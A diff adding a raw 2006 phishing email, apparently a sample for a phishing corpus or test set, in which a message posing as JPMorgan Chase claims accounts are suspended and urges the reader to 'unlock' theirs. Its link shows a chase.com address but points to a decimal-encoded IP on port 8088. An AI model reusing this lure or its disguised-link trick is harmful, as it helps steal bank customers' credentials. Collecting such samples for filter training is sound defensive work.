@@ -1,0 +1,63 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 4270A2A88C
+ for <user@example.com>; Fri, 10 Mar 2006 09:50:48 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id 34953621C9A; Fri, 10 Mar 2006 09:50:48 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 13EEB621C71
+ for <user@example.com>; Fri, 10 Mar 2006 09:50:48 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id JAA28747
+ for user@example.com; Fri, 10 Mar 2006 09:50:47 -0500
+Received: from SERVER2000.TCC (BSN-95-206-46.dsl.siol.net [193.95.206.46])
+ by mail.example.com with ESMTP id JAA28739
+ for <user@example.com>; Fri, 10 Mar 2006 09:50:46 -0500
+Received: from User ([193.95.249.75]) by SERVER2000.TCC with Microsoft
+ SMTPSVC(5.0.2195.5329); Fri, 10 Mar 2006 15:53:36 +0100
+From: "JPMorgan Chase" <security.service@chase.com>
+Subject: Upgrading On-line Security Measures
+Date: Fri, 10 Mar 2006 15:57:28 +0100
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <SERVER2000stPGtPrPr0000004d@SERVER2000.TCC>
+X-OriginalArrivalTime: 10 Mar 2006 14:53:36.0921 (UTC)
+ FILETIME=[692D2090:01C64452]
+To: undisclosed-recipients: ;
+Content-Length: 2178
+Lines: 22
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 322
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>JPMorgan Chase</title>
+</head>
+
+<body>
+
+<div style="width: 600px; margin: 0 auto 0 auto; border: 1px dashed black; padding: 20px 15px 1px 15px; font-size: 12px">
+<img src="http://www.chase.com/ccpmweb/shared/image/chaseNewlogo.gif" />
+<p style="font-weight: bold; color: #074580; font-family: arial;" >Dear Customer,</p>
+<p style="font-weight: bold; color: #074580; font-family: arial;" align="justify">Currently we are trying to upgrade our on-line security measures. All accounts have been temporarly suspended untill each person completes our secure online form. For this operation you will be required to pass trough a series of authentifications.</p>
+<p style="font-weight: bold; color: #074580; font-family: arial;" align="justify">We won't require your ATM PIN number or your name for this operation!</p>
+<p style="font-weight: bold; color: #074580; font-family: arial;" align="justify">To begin unlocking your account please click the link below.</p>
+<p style="font-weight: bold; color: #074580; font-family: arial;" align="center"><a href="http://1222914464:8088/" target="_blank" style="color: #074580">https://www.chase.com/security/do_auth.jsp</a></p>
+<div style="background-color:#f2f2e1; padding: 0 5px 2px 0; margin:0; border: 1px solid red;"><p style="font-weight: bold; color: #074580; font-family: arial; padding: 0; margin: 0;">Please note:</p>
+<p style="font-weight: bold; color: #074580; font-family: arial; padding: 0; margin: 0;" align="justify">If we don't receive your account verification within 72 hours from you, we will further lock down your account untill we will be able to contact you by e-mail or phone. </p>
+</div><div align="center" style="margin-top: 20px;MARGIN-BOTTOM: 10px; COLOR: #666666; font-family: arial; text-align: center; background-image: url(http://www.chase.com/ccpmweb/generic/image/footer_gradient.gif); height: 30px;">©2006 JPMorgan Chase & Co.</div>
+</div>
+</body>
+</html>
